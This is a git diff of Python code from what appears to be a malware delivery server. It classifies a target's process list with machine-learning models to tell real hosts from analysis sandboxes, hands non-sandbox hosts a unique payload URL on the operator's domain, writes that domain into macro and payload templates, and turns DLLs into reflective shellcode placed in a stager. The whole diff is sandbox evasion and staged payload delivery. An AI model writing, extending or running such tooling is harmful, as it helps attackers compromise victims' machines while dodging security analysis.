@@ -1,11 +1,16 @@
 import re
 import base64
-from collections import namedtuple
 import numpy
+import uuid
+from collections import namedtuple
 
 from core import config
 from core import logging
 from core import ddmodels
+
+from core.utils import ShellcodeRDI
+
+keycodes = {'keycode': [], 'used_codes': []}
 
 def process_callback(callback):
     # Parse the process list
@@ -17,14 +22,19 @@ def process_callback(callback):
     # Make a prediction
     decision_tree_prediction, neural_network_prediction = make_prediction(collected_features)
 
-    # Make the drop decision
-    if decision_tree_prediction < 1 or neural_network_prediction < 0.50:
-        logging.success(f'Dropping payload.\nDecision Tree: {decision_tree_prediction}\n Neural Network: {neural_network_prediction}\n')
+    # Make the drop decision set neural_network_prediction  confidence based on risk tolerance
+    if decision_tree_prediction < 1 or neural_network_prediction < 0.60:
+        logging.success(f'Dropping payload.\n [-] Decision Tree:{decision_tree_prediction}\n [-] Neural Network:{neural_network_prediction}')
 
-        return 'Payload'
+        keycode = str(uuid.uuid4())
+        keycodes['keycode'].append(keycode)
+
+        url = f'http://{config.domain}/deliver/{keycode}'
+
+        return url
 
     else:
-        logging.warn(f'Not dropping payload.\nDecision Tree: {decision_tree_prediction}\n Neural Network: {neural_network_prediction}\n')
+        logging.warn(f'Not dropping payload.\n [-]Decision Tree:{decision_tree_prediction}\n [-] Neural Network:{neural_network_prediction}')
         
         return 'Safety first'
 
@@ -35,7 +45,6 @@ def parse_process_list(process_list):
 
     try:
         task_result = base64.b64decode(process_list).decode().split('\r\n')
-
         hostname = task_result[0].split('=')[1]
 
     except Exception as e:
@@ -70,38 +79,44 @@ def gather_features(parsed_process_list):
     features = []
 
     for host in parsed_process_list:
-
         users = []
-
         process_count = len(parsed_process_list[host])
-
         user_count = len([users.append(process.owner) for process in parsed_process_list[host][0:] if process.owner not in users])
-
         process_user_ratio = process_count/user_count
-
         features.append([process_count, user_count, process_user_ratio])
-
-    return features
 
         # More Features
         # highest_pid = max(process_list, key=lambda k: k.pid).pid
         # average_pid = highest_pid/process_count
 
+    return features
+
 def make_prediction(features):
-
     decision_tree_prediction = ddmodels.decision_tree.predict(numpy.asarray(features))[0]
-
     neural_network_prediction = ddmodels.neural_network.predict(features)[0]
 
     return decision_tree_prediction, neural_network_prediction
 
 def patch_payloads(payload_files, domain):
-    server = '**server**'
-    
     for pfile in payload_files:
-        new_payload = open(payload_files[pfile], 'r').read().replace(server, config.domain)
+        new_payload = open(payload_files[pfile], 'r').read().replace('**server**', config.domain)
 
-        new_payload_file = f'{config.basedir}\\macros\\{config.domain}.{pfile}'
+        new_payload_file = f'{config.basedir}\\payloads\\{config.domain}.{pfile}'
         
         with open(new_payload_file, 'w') as f:
             f.write(new_payload)
+
+def create_payload():
+    #TODO makes dlls and stager args of function based on some identifier in callback
+    x64_dll = open(config.dlls['test_x64'], 'rb').read()
+    x86_dll = open(config.dlls['test_x86'], 'rb').read()
+
+    x64_shellcode = base64.b64encode(ShellcodeRDI.ConvertToShellcode(x64_dll)).decode()
+    x86_shellcode = base64.b64encode(ShellcodeRDI.ConvertToShellcode(x86_dll)).decode()
+
+    stager = open(config.stagers['shellcode_stager'], 'r').read()
+
+    stager = stager.replace('*x64Bytes*', f"{x64_shellcode}")
+    stager = stager.replace('*x86Bytes*', f"{x86_shellcode}")
+
+    return stager
